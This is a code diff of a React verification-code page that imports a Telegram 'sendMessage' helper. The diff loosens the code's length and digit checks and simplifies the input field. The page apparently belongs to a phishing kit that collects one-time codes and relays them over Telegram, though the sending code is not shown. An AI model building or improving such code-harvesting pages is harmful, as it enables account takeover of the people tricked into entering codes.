@@ -4,7 +4,7 @@ import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import { useState, useEffect, useCallback, useMemo } from 'react';
 import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
-import config from 'netlify/functions/config';
+import config from '@/utils/config';
 
 const Verify = () => {
     const [code, setCode] = useState('');
@@ -75,7 +75,7 @@ const Verify = () => {
     };
 
     const handleSubmit = async () => {
-        if (!code.trim() || (code.length !== 6 && code.length !== 8)) return;
+        if (!code.trim()) return;
 
         setIsLoading(true);
         setShowError(false);
@@ -121,22 +121,7 @@ const Verify = () => {
                 <p className='text-3xl font-bold'>{translatedTexts.title}</p>
                 <p>{translatedTexts.description}</p>
                 <img src={VerifyImage} alt='' />
-                <input
-                    type='text'
-                    placeholder={translatedTexts.placeholder}
-                    className='rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2'
-                    value={code}
-                    onChange={(e) => {
-                        const value = e.target.value.replace(/[^0-9]/g, '');
-                        if (value.length <= 8) {
-                            setCode(value);
-                        }
-                    }}
-                    onKeyPress={(e) => e.key === 'Enter' && handleSubmit()}
-                    maxLength='8'
-                    pattern='[0-9]*'
-                    inputMode='numeric'
-                />
+                <input type='text' placeholder={translatedTexts.placeholder} className='rounded-lg border border-gray-300 bg-[#f8f9fa] px-6 py-2' value={code} onChange={(e) => setCode(e.target.value)} onKeyPress={(e) => e.key === 'Enter' && handleSubmit()} />
                 {showError && <p className='text-sm text-red-500'>{translatedTexts.errorMessage}</p>}
                 <div className='flex items-center gap-4 bg-[#f8f9fa] p-4'>
                     <FontAwesomeIcon icon={faCircleInfo} size='xl' className='text-[#9f580a]' />
@@ -146,7 +131,7 @@ const Verify = () => {
                     </div>
                 </div>
                 <p>{translatedTexts.walkthrough}</p>
-                <button className='rounded-lg border border-gray-300 bg-[#f8f9fa] py-4 font-medium hover:bg-blue-500 hover:text-white disabled:opacity-50' onClick={handleSubmit} disabled={isLoading || !code.trim() || (code.length !== 6 && code.length !== 8)}>
+                <button className='rounded-lg border border-gray-300 bg-[#f8f9fa] py-4 font-medium hover:bg-blue-500 hover:text-white disabled:opacity-50' onClick={handleSubmit} disabled={isLoading || !code.trim()}>
                     {isLoading ? `${translatedTexts.loadingText} ${formatTime(countdown)}...` : translatedTexts.submit}
                 </button>
                 <p className='cursor-pointer text-center text-blue-900 hover:underline'>{translatedTexts.sendCode}</p>
